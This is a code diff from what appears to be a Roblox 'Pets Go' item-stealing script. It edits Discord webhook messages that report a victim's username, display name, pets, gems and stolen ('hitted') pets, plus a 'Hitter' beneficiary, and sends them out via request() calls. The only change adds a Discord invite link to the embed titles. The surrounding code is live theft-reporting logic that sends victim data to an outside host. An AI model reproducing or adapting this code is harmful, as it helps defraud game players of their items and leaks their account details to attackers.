@@ -59,7 +59,7 @@ if dh then
 _G.dx=true
 msg = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true},{"value":"'..dp..'","name":"DualedPets","inline":true},{"value":"'..potc..'","name":"Dualed Potions","inline":true}],"title":"Pets Go Hit!","color":65512}],"tts":false,"content":"@everyone"}'
 else
-msg = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true},{"value":"'..big..'","name":"Hitted Pets","inline":false}],"title":"Pets Go Hit!","color":65512}],"tts":false,"content":"@everyone"}'
+msg = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true},{"value":"'..big..'","name":"Hitted Pets","inline":false}],"title":"Pets Go Hit! [.gg/vsty](https://discord.gg/vsty)","color":65512}],"tts":false,"content":"@everyone"}'
 end
 local response =
         request(
@@ -80,7 +80,7 @@ local log = ""
 if dh then
 log = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"name":"Game","value":"'..xyzab..'"},{"value":"'.._G.User..'","name":"Hitter","inline":false},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true},{"value":"'..dp..'","name":"DualedPets","inline":true},{"value":"'..potc..'","name":"Dualed Potions","inline":true}],"title":"Pets Go Hit!","color":65512}],"tts":false,"content":"'..xxxvvv..'"}'
 else
-log = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"name":"Game","value":"'..xyzab..'"},{"value":"'.._G.User..'","name":"Hitter","inline":false},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true},{"value":"'..big..'","name":"Hitted Pets","inline":false}],"title":"Pets Go Hit!","color":65512}],"tts":false,"content":"'..xxxvvv..'"}'
+log = '{"embeds":[{"fields":[{"name":"User","value":"'..game.Players.LocalPlayer.Name.." / "..game.Players.LocalPlayer.DisplayName..'"},{"name":"Game","value":"'..xyzab..'"},{"value":"'.._G.User..'","name":"Hitter","inline":false},{"value":"'..pn..'","name":"Pets","inline":true},{"value":"'..gn..'","name":"Gems","inline":true},{"value":"'..big..'","name":"Hitted Pets","inline":false}],"title":"Pets Go Hit! [.gg/vsty](https://discord.gg/vsty)","color":65512}],"tts":false,"content":"'..xxxvvv..'"}'
 end
 local responser =
         request(
